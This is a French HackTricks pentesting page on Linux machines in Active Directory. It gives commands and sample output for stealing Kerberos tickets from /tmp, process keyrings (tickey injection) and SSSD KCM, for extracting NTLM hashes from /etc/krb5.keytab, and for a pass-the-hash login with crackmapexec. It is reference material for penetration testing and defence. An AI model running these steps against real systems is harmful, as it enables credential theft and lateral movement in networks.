# Linux Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de cybersécurité ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Une machine Linux peut également être présente dans un environnement Active Directory.

Une machine Linux dans un AD peut **stocker différents tickets CCACHE dans des fichiers. Ces tickets peuvent être utilisés et exploités comme tout autre ticket Kerberos**. Pour lire ces tickets, vous devrez être le propriétaire utilisateur du ticket ou **root** à l'intérieur de la machine.

## Énumération

### Énumération AD à partir de Linux

Si vous avez accès à un AD sous Linux (ou bash sous Windows), vous pouvez essayer [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) pour énumérer l'AD.

Vous pouvez également consulter la page suivante pour apprendre **d'autres façons d'énumérer AD à partir de Linux** :

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

Il s'agit d'une **alternative** open source à Microsoft Windows **Active** **Directory**, principalement utilisée comme solution de gestion intégrée pour les environnements **Unix**. En savoir plus à ce sujet dans :

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Jouer avec les tickets

### Pass The Ticket

Dans cette page, vous allez trouver différents endroits où vous pourriez **trouver des tickets Kerberos à l'intérieur d'un hôte Linux**, dans la page suivante, vous pouvez apprendre comment transformer ces formats de tickets CCache en Kirbi (le format dont vous avez besoin pour utiliser sous Windows) et également comment effectuer une attaque PTT :

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### Réutilisation de ticket CCACHE à partir de /tmp

> Lorsque les tickets sont définis pour être stockés sous forme de fichier sur le disque, le format et le type standard sont un fichier CCACHE. Il s'agit d'un format de fichier binaire simple pour stocker les informations d'identification Kerberos. Ces fichiers sont généralement stockés dans /tmp et limités à des autorisations 600.

Listez le ticket actuel utilisé pour l'authentification avec `env | grep KRB5CCNAME`. Le format est portable et le ticket peut être **réutilisé en définissant la variable d'environnement** avec `export KRB5CCNAME=/tmp/ticket.ccache`. Le format du nom du ticket Kerberos est `krb5cc_%{uid}` où uid est l'UID de l'utilisateur.
```bash
ls /tmp/ | grep krb5cc
krb5cc_1000
krb5cc_1569901113
krb5cc_1569901115

export KRB5CCNAME=/tmp/krb5cc_1569901115
```
### Réutilisation de tickets CCACHE à partir du trousseau

Les processus peuvent **stocker des tickets Kerberos dans leur mémoire**, cet outil peut être utile pour extraire ces tickets (la protection ptrace doit être désactivée sur la machine `/proc/sys/kernel/yama/ptrace_scope`): [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
```bash
# Configuration and build
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release

[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in tarlogic[1000] session...
[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
[*] Trying to inject in velociraptor[1120601115] session...
[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
[*] Trying to inject in trex[1120601113] session...
[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
[X] [uid:0] Error retrieving tickets
```
### Réutilisation de ticket CCACHE à partir de SSSD KCM

SSSD maintient une copie de la base de données dans le chemin `/var/lib/sss/secrets/secrets.ldb`. La clé correspondante est stockée sous forme de fichier caché dans le chemin `/var/lib/sss/secrets/.secrets.mkey`. Par défaut, la clé n'est lisible que si vous avez les permissions **root**.

En invoquant \*\*`SSSDKCMExtractor` \*\* avec les paramètres --database et --key, la base de données sera analysée et les secrets seront **déchiffrés**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Le **blob de cache de crédential Kerberos peut être converti en un fichier CCache Kerberos utilisable** qui peut être transmis à Mimikatz/Rubeus.

### Réutilisation de ticket CCACHE à partir de keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Extraire des comptes depuis /etc/krb5.keytab

Les clés de service utilisées par les services qui s'exécutent en tant que root sont généralement stockées dans le fichier keytab **`/etc/krb5.keytab`**. Cette clé de service est l'équivalent du mot de passe du service et doit être conservée en sécurité.

Utilisez [`klist`](https://adoptopenjdk.net/?variant=openjdk13\&jvmVariant=hotspot) pour lire le fichier keytab et analyser son contenu. La clé que vous voyez lorsque le [type de clé](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) est 23 est en fait le **NT Hash de l'utilisateur**.
```
klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
[...]
[26] Service principal: host/COMPUTER@DOMAIN
	 KVNO: 25
	 Key type: 23
	 Key: 31d6cfe0d16ae931b73c59d7e0c089c0
	 Time stamp: Oct 07,  2019 09:12:02
[...]
```
Sur Linux, vous pouvez utiliser [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract) : nous voulons le hachage RC4 HMAC pour réutiliser le hachage NLTM.
```bash
python3 keytabextract.py krb5.keytab 
[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
[+] Keytab File successfully imported.
        REALM : DOMAIN
        SERVICE PRINCIPAL : host/computer.domain
        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
```
Sur **macOS**, vous pouvez utiliser [**`bifrost`**](https://github.com/its-a-feature/bifrost).
```bash
./bifrost -action dump -source keytab -path test
```
# Connectez-vous à la machine en utilisant le compte et le hash avec CME.
```bash
$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
```
## Références

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
